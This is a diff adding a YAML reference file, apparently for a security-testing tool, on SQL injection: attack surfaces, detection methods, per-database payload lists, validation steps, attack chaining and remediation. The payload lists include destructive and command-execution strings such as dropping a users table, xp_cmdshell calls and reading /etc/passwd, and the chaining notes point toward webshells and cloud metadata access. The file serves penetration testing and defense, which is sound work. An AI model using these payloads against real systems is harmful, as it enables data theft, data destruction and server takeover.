@@ -1,0 +1,113 @@
+---
+name: sql_injection
+description: SQL injection testing covering union, blind, error-based, and ORM bypass techniques
+category: vulnerabilities
+version: "1.0"
+tags: ["injection", "database", "sql", "owasp-a03"]
+applies_to: ["MySQL", "PostgreSQL", "SQLite", "MSSQL", "Oracle", "MariaDB"]
+severity: "HIGH"
+confidence_threshold: "MEDIUM"
+---
+attack_surface:
+  - "Any user input concatenated into SQL queries"
+  - "Search parameters, filters, pagination"
+  - "Authentication forms (login, password reset)"
+  - "API endpoints accepting IDs, UUIDs, slugs"
+  - "Reporting/analytics endpoints with dynamic queries"
+  - "Order by, group by, limit clauses with user input"
+
+detection_channels:
+  - "Error-based: Database error messages in responses"
+  - "Boolean-based: Different responses for true/false conditions"
+  - "Time-based: Deliberate delays (SLEEP, WAITFOR, pg_sleep)"
+  - "Union-based: Data from other tables in response"
+  - "Out-of-band: DNS/HTTP exfiltration (DNSLOG, Burp Collaborator)"
+  - "Stacked queries: Multiple statements execution"
+
+payload_primitives:
+  error_based:
+    - "' OR 1=1--"
+    - "' OR 1=1#"
+    - "' OR 'x'='x"
+    - "1' AND 1=CONVERT(int,@@version)--"
+    - "' UNION SELECT NULL--"
+    - "' UNION SELECT @@version,2,3--"
+    - "' AND 1=0 UNION SELECT table_name FROM information_schema.tables--"
+    - "1' AND extractvalue(1,concat(0x7e,version(),0x7e))--"
+  boolean_blind:
+    - "' AND 1=1--"
+    - "' AND 1=2--"
+    - "' AND '1'='1"
+    - "' AND '1'='2"
+    - "1 AND 1=1"
+    - "1 AND 1=2"
+  time_based:
+    - "' AND SLEEP(5)--"
+    - "' AND pg_sleep(5)--"
+    - "' AND benchmark(10000000,MD5(1))--"
+    - "'; WAITFOR DELAY '0:0:5'--"
+    - "1 AND SLEEP(5)"
+  union_based:
+    - "UNION SELECT NULL--"
+    - "UNION SELECT NULL,NULL--"
+    - "UNION SELECT NULL,NULL,NULL--"
+    - "' UNION SELECT table_name FROM information_schema.tables--"
+    - "' UNION SELECT @@version,@@hostname,@@datadir--"
+    - "1 UNION SELECT NULL,NULL,NULL--"
+    - "' ORDER BY 1--"
+    - "' ORDER BY 5--"
+  stacked:
+    - "'; DROP TABLE users--"
+    - "'; SELECT pg_sleep(5)--"
+    - "'; EXEC xp_cmdshell('whoami')--"
+  mysql:
+    - "' UNION SELECT @@version,@@hostname,@@datadir,@@basedir--"
+    - "' UNION SELECT user(),database(),version(),@@version_compile_os--"
+    - "1' AND LOAD_FILE('/etc/passwd')--"
+  postgres:
+    - "' UNION SELECT version(),current_database(),current_user,inet_server_addr()--"
+    - "' UNION SELECT current_setting('server_version'),current_database(),current_user--"
+    - "' UNION SELECT table_name FROM information_schema.tables WHERE table_schema='public'--"
+  mssql:
+    - "' UNION SELECT @@VERSION,db_name(),user_name(),@@SERVERNAME--"
+    - "' UNION SELECT name FROM sys.databases--"
+    - "'; EXEC master..xp_cmdshell 'whoami'--"
+  oracle:
+    - "' UNION SELECT banner FROM v$version--"
+    - "' UNION SELECT user,global_name FROM global_name--"
+  sqlite:
+    - "' UNION SELECT sqlite_version(),sql,1 FROM sqlite_master--"
+    - "' UNION SELECT name,sql,1 FROM sqlite_master WHERE type='table'--"
+
+false_positive_validation:
+  - "Verify error message contains database-specific keywords (mysql, postgres, sqlite, ora-)"
+  - "Confirm boolean-based: true condition returns different content than false condition"
+  - "Time-based: Measure response time delta > 4 seconds consistently"
+  - "Union-based: Verify column count matches with ORDER BY technique"
+  - "Check for WAF/IPS blocking (403, 406, challenge pages)"
+  - "Validate extracted data matches expected schema"
+
+chaining_guidance:
+  - "SQLi + File Upload → RCE (write webshell via INTO OUTFILE)"
+  - "SQLi + SSRF → Cloud metadata access (MySQL LOAD_FILE, MSSQL xp_cmdshell)"
+  - "SQLi + Auth Bypass → Privilege escalation (admin hash extraction)"
+  - "Second-order SQLi: Stored payload triggers in different context"
+
+remediation_patterns:
+  - "Use parameterized queries / prepared statements exclusively"
+  - "Employ ORM with proper escaping (avoid raw SQL)"
+  - "Implement allowlist validation for dynamic query parts (table names, columns)"
+  - "Apply principle of least privilege for database users"
+  - "Enable database error handling that doesn't leak details to users"
+  - "Deploy WAF with SQLi rules as defense-in-depth"
+
+code_locations:
+  - "Search for string concatenation in SQL: `\"SELECT * FROM \" + table`"
+  - "Look for f-strings / format strings in queries: `f\"SELECT * FROM users WHERE id={id}\"`"
+  - "Check ORM raw query methods: `.raw()`, `.execute()`, `.query()`"
+  - "Identify dynamic ORDER BY / LIMIT clauses from user input"
+
+references:
+  - "https://owasp.org/www-project-top-ten/2017/A1_Injection"
+  - "https://portswigger.net/web-security/sql-injection"
+  - "https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection"
